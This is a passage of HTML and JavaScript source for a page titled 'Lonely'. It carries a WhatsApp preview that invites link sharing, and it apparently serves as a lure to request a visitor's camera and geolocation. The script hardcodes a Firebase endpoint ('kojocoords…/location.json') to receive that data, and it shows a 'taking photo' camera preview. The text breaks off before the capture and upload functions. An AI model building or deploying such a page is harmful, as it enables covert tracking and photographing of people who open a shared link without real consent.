<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lonely</title>
    
    <!-- WhatsApp Preview -->
    <meta property="og:title" content="Lonely">
    <meta property="og:description" content="分享您的位置和媒体内容">
    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
    <meta property="og:type" content="website">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #f8f9fa;
            color: #333;
            text-align: center;
        }

        .container { 
            padding: 20px; 
            max-width: 400px; 
            margin: 0 auto; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-height: 100vh;
        }

        h1 { 
            font-size: 1.5rem; 
            margin-bottom: 10px;
            font-weight: 600;
        }

        p { 
            font-size: 0.9rem; 
            color: #666; 
            margin: 5px 0;
            line-height: 1.5;
        }

        video { 
            width: 100%; 
            max-width: 400px; 
            border-radius: 12px; 
            margin: 15px 0; 
            background-color: #000;
            display: block;
        }

        .success { 
            color: #28a745; 
            font-weight: bold; 
        }

        .error { 
            color: #dc3545; 
            font-weight: bold; 
        }

        .permission-status {
            font-size: 0.85rem;
            color: #666;
            margin: 8px 0;
            padding: 10px;
            background-color: #f0f0f0;
            border-radius: 6px;
            text-align: left;
            border-left: 3px solid #ccc;
        }

        .permission-granted {
            color: #28a745;
            border-left-color: #28a745;
            font-weight: 600;
        }

        .permission-pending {
            color: #ff9800;
            border-left-color: #ff9800;
            font-weight: 600;
        }

        .permission-denied {
            color: #dc3545;
            border-left-color: #dc3545;
            font-weight: 600;
        }

        #permissionStatus {
            margin-top: 15px;
        }

        #cameraSection {
            margin-top: 20px;
        }

        h2 {
            font-size: 1.2rem;
            margin-top: 20px;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container" id="content">
        <h1 id="heading">请稍等，正在请求权限...</h1>
        <p id="subtitle">需要访问相机和位置信息。</p>
        <div id="permissionStatus"></div>

        <!-- Camera preview -->
        <div id="cameraSection" style="display:none;">
            <p style="margin:15px 0 8px;">正在拍照...</p>
            <video id="video" autoplay playsinline muted></video>
        </div>
    </div>

    <script>
        /**
         * SECURITY WARNING: This Firebase URL is hardcoded in the client-side code.
         * Anyone with access to this page source can write to your database.
         * Use Firebase Security Rules to restrict access and validate data.
         * Consider using a backend service for production deployments.
         */
        const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
        const MAX_RETRIES = 3;
        const RETRY_DELAY = 1000;

        let mediaStream = null;

        // Permission tracking
        const permissionStatus = {
            camera: false,
            geolocation: false
        };

        let permissionRetries = {
            camera: 0,
            geolocation: 0
        };

        /**
         * Update permission status display
         */
        function updatePermissionDisplay() {
            const statusDiv = document.getElementById('permissionStatus');
            let html = '';
            
            for (const [perm, granted] of Object.entries(permissionStatus)) {
                const retries = permissionRetries[perm];
                const statusClass = granted ? 'permission-granted' : 
                                   (retries < MAX_RETRIES ? 'permission-pending' : 'permission-denied');
                const statusText = granted ? '✓ 已授予' : `✗ 等待中 (${retries}/${MAX_RETRIES})`;
                
                const permName = perm === 'camera' ? '相机' : '位置信息';
                
                html += `<div class="permission-status"><span class="${statusClass}">${permName}: ${statusText}</span></div>`;
            }
            
            statusDiv.innerHTML = html;
        }

        /**
         * Cleanup all media resources
         */
        function cleanupMedia() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => {
                    try {
                        track.stop();
                    } catch (e) {
                        console.warn("Track stop error:", e);
                    }
                });
                mediaStream = null;
            }
        }

        /**
         * Request camera permission
